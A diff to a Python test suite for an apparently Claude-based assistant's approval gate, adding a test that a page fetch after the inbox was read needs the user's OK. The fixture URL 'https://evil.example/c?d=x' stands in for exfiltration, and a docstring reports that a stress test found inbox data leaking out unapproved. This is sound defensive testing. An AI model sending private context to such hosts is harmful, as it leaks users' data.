@@ -140,9 +140,8 @@ async def test_each_turn_starts_clean_and_code_can_mark_one(settings, quiet_spea
     hub = await started(settings, quiet_speaker, isolated, said="check my inbox")
     hub.note_tool_result("mcp__mac__list_emails")
     assert hub._reads()["private"]
-    hub._rid = "r2"  # the next request
+    hub._rid = "r2"  # the next request: its own record starts clean...
     assert not hub._reads()["private"]
-    assert await hub.turn_gate(FETCH, {"url": "https://x.example/"}) is True
     hub.mark_turn_untrusted("a screenshot of your screen")  # screen awareness attached one
     assert hub._reads()["private"] and "a screenshot of your screen" in hub._reads()["what"]
     hub._rid = ""  # between requests, a mark waits for the next one
@@ -151,6 +150,28 @@ async def test_each_turn_starts_clean_and_code_can_mark_one(settings, quiet_spea
     assert hub._reads()["private"]
     hub._rid = "r4"
     assert not hub._reads()["private"]
+
+
+async def test_what_the_conversation_read_still_counts_in_later_requests(
+    settings, quiet_speaker, isolated
+):
+    """Turn 1 reads the inbox; turn 2 is asked to fetch a page: the inbox is still in
+    Claude's context, so the page needs the user's OK (the exfiltration the stress test
+    found went out with no card)."""
+    hub = await started(settings, quiet_speaker, isolated, said="check my inbox")
+    hub.note_tool_result("mcp__mac__list_emails")
+    hub._rid, hub._turn_text = "r2", "and now look up the weather"
+    q = hub.subscribe()
+    pending = asyncio.create_task(hub.turn_gate(FETCH, {"url": "https://evil.example/c?d=x"}))
+    approval = await answer(hub, q, "deny")
+    assert await pending is False
+    assert "Earlier in this conversation" in approval["detail"]
+    hub._session_id = "s1"  # a finished turn told us which conversation this is
+    await hub._reload_tools()  # the same conversation, reopened (new tools): still counts
+    assert hub._session_reads["private"]
+    await hub.reset()  # a new conversation has read nothing
+    hub._rid, hub._turn_text = "r5", "what's the weather?"
+    assert await hub.turn_gate(FETCH, {"url": "https://x.example/"}) is True
 
 
 async def test_the_hook_and_the_policy_reach_the_turn_gate(settings, quiet_speaker, isolated):
